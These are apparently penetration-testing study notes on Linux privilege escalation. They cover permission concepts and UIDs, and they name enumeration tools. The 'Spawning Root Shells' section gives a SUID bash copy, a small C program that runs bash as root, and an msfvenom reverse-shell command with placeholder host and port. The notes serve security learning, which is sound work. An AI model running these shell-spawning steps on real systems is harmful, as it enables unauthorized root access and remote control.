
--- Linux Privilege Escalation ---

• Privilege Escalation in Linux
• Understanding Permissions in Linux
• Spawning Root Shells
• Privilege Escalation Tools
• Kernel Exploits
• Service Exploits
• Weak File Permissions
• Sudo
• Cron Jobs
• SUID / SGID Executables
• Passwords & Keys
• NFS


-- Privilege Escalation in Linux --

Our ultimate goal with privilege escalation in Linux is to gain a shell running as the root user.
Privilege escalation can be simple (e.g. a kernel exploit) or require a lot of reconnaissance on the compromised system.
In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfigurations.
All privilege escalations are effectively examples of access control violations.
Access control and user permissions are intrinsically linked.


-- Understanding Permissions in Linux --

• Users, Groups, and Files & Directories
• Users
• Groups
• Files & Directories
• File Permissions
• Directory Permissions
• Special Permissions
• Viewing Permissions
• Real, Effective, & Saved UID/GID

➜ Users, Groups, and Files & Directories

At a basic level, permissions in Linux are a relationship between users, groups, and files & directories.
Users can belong to multiple groups. Groups can have multiple users. 
Every file and directory defines its permissions in terms of a user, a group, and “others” (all other users).

➜ Users

User accounts are configured in the /etc/passwd file.
User password hashes are stored in the /etc/shadow file.
Users are identified by an integer user ID (UID).
The "root" user account is a special type of account in Linux. It has an UID of 0, and the system grants this user access to every file.

➜ Groups

Groups are configured in the /etc/group file.
Users have a primary group, and can have multiple secondary (or supplementary) groups.
By default, a user’s primary group has the same name as their user account.

➜ Files & Directories

All files & directories have a single owner and a group.
Permissions are defined in terms of read, write, and execute operations.
There are three sets of permissions, one for the owner, one for the group, and one for all "other" users (can also be referred to as "world").
Only the owner can change permissions.

➜ File Permissions

File permissions are self explanatory:
• Read – when set, the file contents can be read.
• Write – when set, the file contents can be modified.
• Execute – when set, the file can be executed (i.e. run as some kind of process).

➜ Directory Permissions

Directory permissions are slightly more complicated:
• Execute – when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
• Read – when set, the directory contents can be listed.
• Write – when set, files and subdirectories can be created in the directory.

➜ Special Permissions

⇒ setuid (SUID) bit: When set, files will get executed with the privileges of the file owner.
⇒ setgid (SGID) bit: When set on a file, the file will get executed with the privileges of the file group. When set on a directory, files created within that directory will inherit the group of the directory itself.

➜ Viewing Permissions

The ls command can be used to view permissions:

$ ls -l /bin/date
-rwxr-xr-x 1 root root 60416 Apr 28 2010 /bin/date

The first 10 characters indicate the permissions set on the file or directory.
The first character simply indicates the type (e.g. '-' for file, 'd' for directory).
The remaining 9 characters represent the 3 sets of permissions (owner, group, others).
Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions.
SUID/SGID permissions are represented by an 's' in the execute position.

➜ Real, Effective, & Saved UID/GID

I previously stated that users are identified by a user ID.
In fact, each user has 3 user IDs in Linux (real, effective, and saved).
A user’s real ID is who they actually are (the ID defined in /etc/passwd). Ironically, the real ID is actually used less often to check a user’s identity.

A user’s effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID.
The effective ID is used in most access control decisions to verify a user, and commands such as whoami use the effective ID.
The saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID.

Print real and effective user / group IDs: id

# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

Print real, effective, saved, and file system user / group IDs of the current process (i.e. our shell): cat /proc/$$/status | grep "[UG]id"

# cat /proc/$$/status | grep "[UG]id"
Uid: 1000 0 0 0
Gid: 1000 0 0 0


-- Spawning Root Shells --

Our ultimate goal is to spawn a root shell. 
While the end result is the same (executing /bin/sh or /bin/bash), there are multiple ways of achieving this execution.

• "rootbash" SUID
• Custom Executable
• msfvenom
• Native Reverse Shells
• Privilege Escalation Tools

➜ "rootbash" SUID

One of ways to spawn a root shell is to create a copy of the /bin/bash executable file (I usually rename it rootbash), make sure it is owned by the root user, and has the SUID bit set.
A root shell can be spawned by simply executing the rootbash file with the -p command line option.
The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times).

➜ Custom Executable

There may be instances where some root process executes another process which you can control. 
In these cases, the following C code, once compiled, will spawn a Bash shell running as root:

int main() {
  setuid(0);
  system("/bin/bash -p");
}

Compile using: $ gcc -o <name> <filename.c>

➜ msfvenom

Alternatively, if a reverse shell is preferred, msfvenom can be used to generate an executable (.elf) file:

$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

This reverse shell can be caught using netcat or Metasploit’s own multi/handler.

➜ Native Reverse Shells

There are multiple ways to spawn reverse shells natively on many Linux distributions.

A good tool for suggesting these is: https://github.com/mthbernardes/rsg

All can be caught using a simple netcat listener.

➜ Privilege Escalation Tools

While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.
We will use Linux Smart Enumeration and LinEnum.

• Linux Smart Enumeration
• LinEnum

➜ Linux Smart Enumeration

Linux Smart Enumeration (lse.sh) has recently become my personal favorite privilege escalation tool.
In addition to being a Bash script (which helps if Python isn’t installed), it has multiple levels which gradually reveal more and more information.

$ chmod+x lse.sh
$ ./lse.sh -h

$ ./lse.sh
$ ./lse.sh -l1 -i
$ ./lse.sh -l2 -i

➜ LinEnum

LinEnum is an advanced Bash script which extracts a large amount of useful information from the target system.
It can copy interesting files for export, and search for files containing a keyword (e.g. “password”).




Links

https://github.com/diego-treitos/linux-smart-enumeration
https://github.com/rebootuser/LinEnum

https://github.com/linted/linuxprivchecker
https://github.com/AlessandroZ/BeRoot
http://pentestmonkey.net/tools/audit/unix-privesc-check


•
➜ 
⇒
->
►


*
